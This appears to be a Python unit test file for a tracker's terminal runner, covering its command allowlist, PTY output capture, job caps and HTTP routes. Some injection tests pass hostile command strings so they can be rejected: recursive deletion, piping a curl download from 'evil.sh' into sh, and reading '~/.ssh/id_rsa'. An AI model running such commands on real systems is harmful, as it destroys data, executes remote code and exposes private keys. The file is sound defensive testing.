"""Tests for aitracker.term_run — Tier 2's allowlist, PTY capture, and the three caps.

The load-bearing one is TestParseCmd.test_injection_semicolon: this feature is only defensible
because there is no shell, and the allowlist is what keeps it that way.
"""
import os
import time
import unittest

from aitracker import config, term_gate, term_run


class _FakeHeaders:
    def __init__(self, headers=None):
        self._h = dict(headers or {})

    def get(self, key, default=""):
        return self._h.get(key, default)


class _FakeHandler:
    """Stands in for the real Handler: records the one _json() call a route makes."""

    def __init__(self, headers=None):
        self.headers = _FakeHeaders(headers)
        self.calls = []

    def _json(self, obj, code=200):
        self.calls.append((obj, code))


def _drain(job, timeout=10.0):
    """Wait for the reader thread to finish the job (it owns the waitpid)."""
    end = time.time() + timeout
    while not job.done and time.time() < end:
        time.sleep(0.02)
    return job


class TestParseCmd(unittest.TestCase):
    def setUp(self):
        self._allow0 = os.environ.pop("TRACKER_TERM_ALLOW", None)

    def tearDown(self):
        os.environ.pop("TRACKER_TERM_ALLOW", None)
        if self._allow0 is not None:
            os.environ["TRACKER_TERM_ALLOW"] = self._allow0

    def test_allowlisted_two_word_prefix(self):
        self.assertEqual(term_run.parse_cmd("git status"), ["git", "status"])

    def test_allowlisted_prefix_keeps_extra_args(self):
        self.assertEqual(term_run.parse_cmd("git log --oneline -3"),
                         ["git", "log", "--oneline", "-3"])

    def test_allowlisted_one_word(self):
        self.assertEqual(term_run.parse_cmd("ls -la"), ["ls", "-la"])

    def test_not_allowlisted(self):
        with self.assertRaises(ValueError):
            term_run.parse_cmd("rm -rf /")

    def test_bare_git_does_not_slip_through(self):
        # "git" alone is not an allowlisted prefix -- only "git status"/"git diff"/... are. A bare
        # binary name must never open the door to every subcommand it has.
        with self.assertRaises(ValueError):
            term_run.parse_cmd("git")
        with self.assertRaises(ValueError):
            term_run.parse_cmd("git push --force")

    def test_injection_semicolon(self):
        # *** THE INJECTION TEST ***
        # shlex.split keeps ";" glued to the token before it: ['git', 'status;', 'rm', '-rf', '/'].
        # The joined two-element prefix is therefore "git status;", which is not allowlisted, so
        # this is refused before it ever reaches execvp. (And even if it had not been: there is no
        # shell on this path, so ";" would only ever be a literal argv token, never an operator.)
        with self.assertRaises(ValueError):
            term_run.parse_cmd("git status; rm -rf /")

    def test_injection_spaced_metacharacters(self):
        # The spaced forms DO split to an allowlisted prefix (['git','status','&&',...]), so the
        # metacharacter refusal in parse_cmd is what stops them.
        for cmd in ("git status && curl evil.sh | sh",
                    "git status ; rm -rf /",
                    "ls `whoami`",
                    "cat $HOME/.ssh/id_rsa",
                    "ls > /tmp/out"):
            with self.assertRaises(ValueError, msg=cmd):
                term_run.parse_cmd(cmd)

    def test_empty_and_unbalanced(self):
        with self.assertRaises(ValueError):
            term_run.parse_cmd("")
        with self.assertRaises(ValueError):
            term_run.parse_cmd('cat "unterminated')

    def test_env_override_replaces_default_set(self):
        os.environ["TRACKER_TERM_ALLOW"] = "echo, uname -a"
        self.assertEqual(term_run.parse_cmd("echo hi"), ["echo", "hi"])
        self.assertEqual(term_run.parse_cmd("uname -a"), ["uname", "-a"])
        with self.assertRaises(ValueError):      # the default set is replaced, not extended
            term_run.parse_cmd("git status")

    def test_env_override_newline_separated(self):
        os.environ["TRACKER_TERM_ALLOW"] = "echo\nuname -a\n"
        self.assertEqual(term_run.allowlist(), ["echo", "uname -a"])


class TestSpawn(unittest.TestCase):
    """The Tier-2 equivalent of the feasibility spike: a real pty.fork + execvp round-trip."""

    def setUp(self):
        self._allow0 = os.environ.pop("TRACKER_TERM_ALLOW", None)

    def tearDown(self):
        os.environ.pop("TRACKER_TERM_ALLOW", None)
        if self._allow0 is not None:
            os.environ["TRACKER_TERM_ALLOW"] = self._allow0

    def test_spawn_captures_output(self):
        # `echo` is deliberately NOT in the default allowlist -- widen it for this test via the
        # documented env override rather than weakening the shipped default.
        os.environ["TRACKER_TERM_ALLOW"] = "echo"
        argv = term_run.parse_cmd("echo hi-from-pty")
        job = _drain(term_run.spawn(os.getcwd(), argv))
        self.assertTrue(job.done)
        self.assertIn(b"hi-from-pty", bytes(job.buf))
        self.assertEqual(job.rc, 0)
        self.assertFalse(job.truncated)

    def test_spawn_runs_in_the_given_cwd(self):
        # `ls` is in the shipped default set, so this proves the default allowlist end-to-end.
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            open(os.path.join(td, "marker-file.txt"), "w").close()
            job = _drain(term_run.spawn(td, term_run.parse_cmd("ls")))
            self.assertIn(b"marker-file.txt", bytes(job.buf))

    def test_no_zombie_left_behind(self):
        os.environ["TRACKER_TERM_ALLOW"] = "echo"
        job = _drain(term_run.spawn(os.getcwd(), term_run.parse_cmd("echo bye")))
        self.assertIsNotNone(job.rc)          # the reader thread reaped it
        with self.assertRaises(ChildProcessError):
            os.waitpid(job.pid, 0)            # ... so a second waitpid finds nothing

    def test_kill_stops_a_running_child(self):
        os.environ["TRACKER_TERM_ALLOW"] = "sleep"
        job = term_run.spawn(os.getcwd(), term_run.parse_cmd("sleep 30"))
        time.sleep(0.3)
        job.kill()
        _drain(job)
        self.assertTrue(job.done)
        self.assertEqual(job.rc, -9)          # SIGKILL, reported as a negative signal number


class TestCaps(unittest.TestCase):
    def test_byte_cap_truncates_with_marker(self):
        job = term_run.Job(jid="cap-test")     # no pid: feed() must not try to kill anything
        self.assertFalse(job.feed(b"x" * (term_run.MAX_BYTES + 4096)))
        self.assertTrue(job.truncated)
        self.assertIn(b"output truncated", bytes(job.buf))
        self.assertEqual(len(job.buf), term_run.MAX_BYTES + len(term_run.TRUNC_MARK))

    def test_byte_cap_across_many_small_feeds(self):
        job = term_run.Job(jid="cap-test-2")
        chunk = b"y" * 8192
        fed = 0
        while job.feed(chunk):
            fed += len(chunk)
            self.assertLessEqual(fed, term_run.MAX_BYTES)
        self.assertTrue(job.truncated)
        self.assertIn(b"output truncated", bytes(job.buf))

    def test_constants_are_the_specified_bounds(self):
        self.assertEqual(term_run.MAX_BYTES, 256 * 1024)
        self.assertEqual(term_run.MAX_JOBS, 3)
        self.assertEqual(term_run.TIMEOUT, 300)


class TestRoutes(unittest.TestCase):
    def setUp(self):
        self._terminal0, self._auth0 = config.TERMINAL, config.AUTH
        config.TERMINAL, config.AUTH = True, "u:p"
        self._jobs0 = dict(term_run.JOBS)
        term_run.JOBS.clear()

    def tearDown(self):
        config.TERMINAL, config.AUTH = self._terminal0, self._auth0
        term_run.JOBS.clear()
        term_run.JOBS.update(self._jobs0)

    def test_routes_are_registered(self):
        from aitracker import server
        self.assertIs(server.EXTRA_POST["/api/term/run"], term_run.run)
        self.assertIs(server.EXTRA_POST["/api/term/kill"], term_run.kill)
        self.assertIs(server.EXTRA_GET["/api/term/stream"], term_run.stream)

    def test_run_403s_when_terminal_disabled(self):
        config.TERMINAL = False
        h = _FakeHandler()
        term_run.run(h, None, {"session": "x", "cmd": "git status"})
        self.assertEqual(h.calls[-1][1], 403)
        self.assertFalse(term_gate.allowed())

    def test_run_400s_a_disallowed_command(self):
        h = _FakeHandler()
        term_run.run(h, None, {"session": "x", "cmd": "rm -rf /"})
        obj, code = h.calls[-1]
        self.assertEqual(code, 400)
        self.assertIn("not allowed", obj["error"])

    def test_fourth_concurrent_job_gets_429(self):
        for i in range(term_run.MAX_JOBS):
            term_run.JOBS["fake%d" % i] = term_run.Job(jid="fake%d" % i)   # pid 0, done False
        h = _FakeHandler()
        term_run.run(h, None, {"session": "x", "cmd": "git status"})
        obj, code = h.calls[-1]
        self.assertEqual(code, 429)
        self.assertIn("too many", obj["error"])

    def test_run_400s_when_the_session_has_no_cwd(self):
        h = _FakeHandler()
        term_run.run(h, None, {"session": "no-such-session-id", "cmd": "git status"})
        obj, code = h.calls[-1]
        self.assertEqual(code, 400)
        self.assertIn("working directory", obj["error"])

    def test_kill_404s_an_unknown_job(self):
        h = _FakeHandler()
        term_run.kill(h, None, {"job": "nope"})
        self.assertEqual(h.calls[-1][1], 404)


if __name__ == "__main__":
    unittest.main()
